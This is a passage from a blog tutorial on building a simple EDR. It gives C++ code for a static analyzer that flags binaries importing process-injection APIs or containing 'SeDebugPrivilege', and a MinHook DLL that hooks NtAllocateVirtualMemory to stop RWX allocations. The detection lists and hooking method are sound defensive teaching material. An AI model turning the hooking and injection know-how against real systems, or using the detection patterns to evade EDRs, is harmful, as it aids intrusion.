</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        IMAGE_NT_HEADERS<span style="color:#f92672">*</span> ntHeaders <span style="color:#f92672">=</span> ImageNtHeader(hModule);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ntHeaders <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Locate the IAT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            IMAGE_IMPORT_DESCRIPTOR<span style="color:#f92672">*</span> importDesc <span style="color:#f92672">=</span> (IMAGE_IMPORT_DESCRIPTOR<span style="color:#f92672">*</span>)((BYTE<span style="color:#f92672">*</span>)hModule <span style="color:#f92672">+</span> ntHeaders<span style="color:#f92672">-&gt;</span>OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Loop over the DLL's
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">while</span> (importDesc<span style="color:#f92672">-&gt;</span>Name <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> moduleName <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)((BYTE<span style="color:#f92672">*</span>)hModule <span style="color:#f92672">+</span> importDesc<span style="color:#f92672">-&gt;</span>Name);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// Loop over the functions of the DLL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                IMAGE_THUNK_DATA<span style="color:#f92672">*</span> thunk <span style="color:#f92672">=</span> (IMAGE_THUNK_DATA<span style="color:#f92672">*</span>)((BYTE<span style="color:#f92672">*</span>)hModule <span style="color:#f92672">+</span> importDesc<span style="color:#f92672">-&gt;</span>OriginalFirstThunk);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">while</span> (thunk<span style="color:#f92672">-&gt;</span>u1.AddressOfData <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (thunk<span style="color:#f92672">-&gt;</span>u1.Ordinal <span style="color:#f92672">&amp;</span> IMAGE_ORDINAL_FLAG) {
</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// printf("\tOrdinal: %llu\n", IMAGE_ORDINAL(thunk-&gt;u1.Ordinal));
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                        IMAGE_IMPORT_BY_NAME<span style="color:#f92672">*</span> importByName <span style="color:#f92672">=</span> (IMAGE_IMPORT_BY_NAME<span style="color:#f92672">*</span>)((BYTE<span style="color:#f92672">*</span>)hModule <span style="color:#f92672">+</span> thunk<span style="color:#f92672">-&gt;</span>u1.AddressOfData);
</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// printf("\tFunction: %s\n", importByName-&gt;Name);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e">// Checks if the following functions are used by the binary
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (strcmp(<span style="color:#e6db74">"OpenProcess"</span>, importByName<span style="color:#f92672">-&gt;</span>Name) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                            isOpenProcessPresent <span style="color:#f92672">=</span> TRUE;
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (strcmp(<span style="color:#e6db74">"VirtualAllocEx"</span>, importByName<span style="color:#f92672">-&gt;</span>Name) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                            isVirtualAllocExPresent <span style="color:#f92672">=</span> TRUE;
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (strcmp(<span style="color:#e6db74">"WriteProcessMemory"</span>, importByName<span style="color:#f92672">-&gt;</span>Name) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                            isWriteProcessMemoryPresent <span style="color:#f92672">=</span> TRUE;
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (strcmp(<span style="color:#e6db74">"CreateRemoteThread"</span>, importByName<span style="color:#f92672">-&gt;</span>Name) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                            isCreateRemoteThreadPresent <span style="color:#f92672">=</span> TRUE;
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    thunk<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                importDesc<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            FreeLibrary(hModule);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        FreeLibrary(hModule);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (isOpenProcessPresent <span style="color:#f92672">&amp;&amp;</span> isVirtualAllocExPresent <span style="color:#f92672">&amp;&amp;</span> isWriteProcessMemoryPresent <span style="color:#f92672">&amp;&amp;</span> isCreateRemoteThreadPresent) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">lookForSeDebugPrivilegeString</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> filename) {
</span></span><span style="display:flex;"><span>    FILE<span style="color:#f92672">*</span> file;
</span></span><span style="display:flex;"><span>    _wfopen_s(<span style="color:#f92672">&amp;</span>file, filename, <span style="color:#e6db74">L</span><span style="color:#e6db74">"rb"</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>        fseek(file, <span style="color:#ae81ff">0</span>, SEEK_END);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">long</span> file_size <span style="color:#f92672">=</span> ftell(file);
</span></span><span style="display:flex;"><span>        rewind(file);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)malloc(file_size);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (buffer <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (fread(buffer, <span style="color:#ae81ff">1</span>, file_size, file) <span style="color:#f92672">==</span> file_size) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> search_string <span style="color:#f92672">=</span> <span style="color:#e6db74">"SeDebugPrivilege"</span>;
</span></span><span style="display:flex;"><span>                size_t search_length <span style="color:#f92672">=</span> strlen(search_string);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> i, j;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> found <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> file_size <span style="color:#f92672">-</span> search_length; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> (j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> search_length; j<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (buffer[i <span style="color:#f92672">+</span> j] <span style="color:#f92672">!=</span> search_string[j]) {
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (j <span style="color:#f92672">==</span> search_length) {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            free(buffer);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        fclose(file);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    LPCWSTR pipeName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">pipe</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">dumbedr-analyzer"</span>;
</span></span><span style="display:flex;"><span>    DWORD bytesRead <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">wchar_t</span> target_binary_file[MESSAGE_SIZE] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">"Launching analyzer named pipe server</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Creates a named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    HANDLE hServerPipe <span style="color:#f92672">=</span> CreateNamedPipe(
</span></span><span style="display:flex;"><span>        pipeName,                 <span style="color:#75715e">// Pipe name to create
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PIPE_ACCESS_DUPLEX,       <span style="color:#75715e">// Whether the pipe is supposed to receive or send data (can be both)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PIPE_TYPE_MESSAGE,        <span style="color:#75715e">// Pipe mode (whether or not the pipe is waiting for data)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PIPE_UNLIMITED_INSTANCES, <span style="color:#75715e">// Maximum number of instances from 1 to PIPE_UNLIMITED_INSTANCES
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        MESSAGE_SIZE,             <span style="color:#75715e">// Number of bytes for output buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        MESSAGE_SIZE,             <span style="color:#75715e">// Number of bytes for input buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0</span>,                        <span style="color:#75715e">// Pipe timeout 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        NULL                      <span style="color:#75715e">// Security attributes (anonymous connection or may be needs credentials. )
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (TRUE) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ConnectNamedPipe enables a named pipe server to start listening for incoming connections
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        BOOL isPipeConnected <span style="color:#f92672">=</span> ConnectNamedPipe(
</span></span><span style="display:flex;"><span>            hServerPipe, <span style="color:#75715e">// Handle to the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            NULL         <span style="color:#75715e">// Whether or not the pipe supports overlapped operations
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">wchar_t</span> target_binary_file[MESSAGE_SIZE] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (isPipeConnected) {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Read from the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ReadFile(
</span></span><span style="display:flex;"><span>                hServerPipe,         <span style="color:#75715e">// Handle to the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#f92672">&amp;</span>target_binary_file, <span style="color:#75715e">// Target buffer where to stock the output
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                MESSAGE_SIZE,        <span style="color:#75715e">// Size of the buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#f92672">&amp;</span>bytesRead,          <span style="color:#75715e">// Number of bytes read from ReadFile
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                NULL                 <span style="color:#75715e">// Whether or not the pipe supports overlapped operations
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">"~&gt; Received binary file %ws</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, target_binary_file);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            BOOL isSeDebugPrivilegeStringPresent <span style="color:#f92672">=</span> lookForSeDebugPrivilegeString(target_binary_file);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (isSeDebugPrivilegeStringPresent <span style="color:#f92672">==</span> TRUE) {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t\033</span><span style="color:#e6db74">[31mFound SeDebugPrivilege string.</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t\033</span><span style="color:#e6db74">[32mSeDebugPrivilege string not found.</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            BOOL isDangerousFunctionsFound <span style="color:#f92672">=</span> ListImportedFunctions(target_binary_file);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (isDangerousFunctionsFound <span style="color:#f92672">==</span> TRUE) {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t\033</span><span style="color:#e6db74">[31mDangerous functions found.</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t\033</span><span style="color:#e6db74">[32mNo dangerous functions found.</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            BOOL isSigned <span style="color:#f92672">=</span> VerifyEmbeddedSignature(target_binary_file);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (isSigned <span style="color:#f92672">==</span> TRUE) {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t\033</span><span style="color:#e6db74">[32mBinary is signed.</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t\033</span><span style="color:#e6db74">[31mBinary is not signed.</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">wchar_t</span> response[MESSAGE_SIZE] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (isSigned <span style="color:#f92672">==</span> TRUE) {
</span></span><span style="display:flex;"><span>                swprintf_s(response, MESSAGE_SIZE, <span style="color:#e6db74">L</span><span style="color:#e6db74">"OK</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\t\033</span><span style="color:#e6db74">[32mStaticAnalyzer allows</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// If the following conditions are met, the binary is blocked
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (isDangerousFunctionsFound <span style="color:#f92672">||</span> isSeDebugPrivilegeStringPresent) {
</span></span><span style="display:flex;"><span>                    swprintf_s(response, MESSAGE_SIZE, <span style="color:#e6db74">L</span><span style="color:#e6db74">"KO</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\n\t\033</span><span style="color:#e6db74">[31mStaticAnalyzer denies</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    swprintf_s(response, MESSAGE_SIZE, <span style="color:#e6db74">L</span><span style="color:#e6db74">"OK</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\n\t\033</span><span style="color:#e6db74">[32mStaticAnalyzer allows</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            DWORD bytesWritten <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Write to the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            WriteFile(
</span></span><span style="display:flex;"><span>                hServerPipe,   <span style="color:#75715e">// Handle to the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                response,      <span style="color:#75715e">// Buffer to write from
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                MESSAGE_SIZE,  <span style="color:#75715e">// Size of the buffer 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#f92672">&amp;</span>bytesWritten, <span style="color:#75715e">// Numbers of bytes written
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                NULL           <span style="color:#75715e">// Whether or not the pipe supports overlapped operations
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Disconnect
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        DisconnectNamedPipe(
</span></span><span style="display:flex;"><span>            hServerPipe <span style="color:#75715e">// Handle to the named pipe
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">"</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Pretty simple. The remote injector agent will be a little bit more complicated!</p>
<h2 id="2-the-remote-injector">2/ The remote injector</h2>
<p>One thing EDR’s like to do is to apply a mechanism called function hooking.</p>
<p>As we have seen before, and because of PatchGuard, it is not possible to modify the SSDT nor any critical kernel structures anymore. So what anti-virus editors thought of is to modify the NTDLL.dll directly. Since it is the last building block before entering the kernel space, and since it is the user mode reflection of the kernel itself, if a defender is able to analyze the parameters sent to the functions exposed by the NTDLL.dll, he will be able to analyze dynamically if these functions call are legitimate or malicious. To do so, EDR’s are simply redirecting the code flow from the NTDLL.dll functions to their own code:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/edrredirect.png" alt="User to kernel diagram"></p>
<p>Question is, how to redirect the code flow from the NTDLL.dll? Well, when a process is created, it loads a copy of a few necessary DLL’s. Obviously, a copy of the NTDLL.dll is made and, if we are skilled enough, we can modify its content. Therefore, to modify the code flow of a function from the NTDLL.dll, we simply need to parse the NTDLL.dll, find the functions we want to hook and modify its code so that it jumps to the code of our EDR.</p>
<p>Easy in theory. A lot harder in practice. Hopefully there is an insane library called <a href="https://github.com/TsudaKageyu/minhook">MinHook</a>, developped by TsudaKageyu, that will allow us doing it quite easily. Via the MinHook library we are going to develope a DLL that the remote injector agent will inject in each and every proceses being created. This DLL will only hook one function from the NTDLL.dll: NtAllocateVirtualMemory. But why this function ? Because the NtAllocateVirtualMemory is the function from the NTDLL.dll that is used to allocate and protect a memory space. Since our EDR will focus on detecting tools that inject shellcodes remotely, this function is the most important one to monitore.</p>
<p>Below you will find the commented code of the DLL that we will inject:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">"pch.h"</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">"minhook/include/MinHook.h"</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Defines the prototype of the NtAllocateVirtualMemoryFunction
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span>(NTAPI<span style="color:#f92672">*</span> pNtAllocateVirtualMemory)(
</span></span><span style="display:flex;"><span>    HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span>    PVOID<span style="color:#f92672">*</span> BaseAddress,
</span></span><span style="display:flex;"><span>    ULONG_PTR ZeroBits,
</span></span><span style="display:flex;"><span>    PSIZE_T RegionSize,
</span></span><span style="display:flex;"><span>    ULONG AllocationType,
</span></span><span style="display:flex;"><span>    ULONG Protect
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Pointer to the trampoline function used to call the original NtAllocateVirtualMemory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>pNtAllocateVirtualMemory pOriginalNtAllocateVirtualMemory <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// This is the function that will be called whenever the injected process calls 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// NtAllocateVirtualMemory. This function takes the arguments Protect and checks
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// if the requested protection is RWX (which shouldn't happen).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>DWORD NTAPI <span style="color:#a6e22e">NtAllocateVirtualMemory</span>(
</span></span><span style="display:flex;"><span>    HANDLE ProcessHandle, 
</span></span><span style="display:flex;"><span>    PVOID<span style="color:#f92672">*</span> BaseAddress, 
</span></span><span style="display:flex;"><span>    ULONG_PTR ZeroBits, 
</span></span><span style="display:flex;"><span>    PSIZE_T RegionSize, 
</span></span><span style="display:flex;"><span>    ULONG AllocationType, 
</span></span><span style="display:flex;"><span>    ULONG Protect
</span></span><span style="display:flex;"><span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Checks if the program is trying to allocate some memory and protect it with RWX 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (Protect <span style="color:#f92672">==</span> PAGE_EXECUTE_READWRITE) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// If yes, we notify the user and terminate the process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        MessageBox(NULL, <span style="color:#e6db74">L</span><span style="color:#e6db74">"Dude, are you trying to RWX me ?"</span>, <span style="color:#e6db74">L</span><span style="color:#e6db74">"Found u bro"</span>, MB_OK);
</span></span><span style="display:flex;"><span>        TerminateProcess(GetCurrentProcess(), <span style="color:#ae81ff">0xdeadb33f</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//If no, we jump on the originate NtAllocateVirtualMemory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> pOriginalNtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// This function initializes the hooks via the MinHook library
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>DWORD WINAPI <span style="color:#a6e22e">InitHooksThread</span>(LPVOID param) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (MH_Initialize() <span style="color:#f92672">!=</span> MH_OK) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Here we specify which function from wich DLL we want to hook
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    MH_CreateHookApi(   
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">"ntdll"</span>,                                     <span style="color:#75715e">// Name of the DLL containing the function to  hook
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">"NtAllocateVirtualMemory"</span>,                    <span style="color:#75715e">// Name of the function to hook
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        NtAllocateVirtualMemory,                      <span style="color:#75715e">// Address of the function on which to jump when hooking 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        (LPVOID <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>pOriginalNtAllocateVirtualMemory) <span style="color:#75715e">// Address of the original NtAllocateVirtualMemory function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Enable the hook on NtAllocateVirtualMemory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    MH_STATUS status <span style="color:#f92672">=</span> MH_EnableHook(MH_ALL_HOOKS);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> status;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Here is the DllMain of our DLL
